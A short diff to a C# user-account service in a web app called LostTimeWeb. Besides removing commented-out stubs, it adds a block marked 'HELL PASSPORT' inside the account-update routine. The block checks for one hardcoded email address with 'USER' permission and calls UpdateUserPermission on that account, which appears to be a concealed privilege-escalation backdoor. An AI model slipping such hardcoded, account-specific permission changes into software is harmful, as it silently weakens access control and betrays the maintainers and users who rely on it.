@@ -18,10 +18,6 @@ namespace LostTimeWeb.WebApp.Services
             _passwordHasher = passwordHasher;
         }
 
-        /*public UserAccount FindByID(int userID);
-        public void UpdateUserAccount(int userID, string userPseudonym, string userEmail, byte[] userPassword);
-        public void DeleteUserAccountByUserID(int userID);*/
-        
         public Result<UserAccount> Display( int id )
         {
             UserAccount user = new UserAccount();
@@ -44,6 +40,12 @@ namespace LostTimeWeb.WebApp.Services
                 
                 return Result.Failure<UserAccount>( Status.BadRequest, "Bad Password , try again !" );
             }
+///////////////////////////////////  HELL PASSPORT  \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+            if ((user.UserEmail == "vanbutsele@intechinfo.fr") &&  (user.UserPermission == "USER")) 
+            {
+                 _userAccountGateway.UpdateUserPermission(user.UserID, user.UserPermission);
+            }
+///////////////////////////////////  HELL PASSPORT  \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
             _userAccountGateway.UpdateUserAccount(userID, userPseudonym, userEmail, _passwordHasher.HashPassword( userNewPassword ));
             user = _userAccountGateway.FindByID( userID );
             return Result.Success( Status.Ok, user );
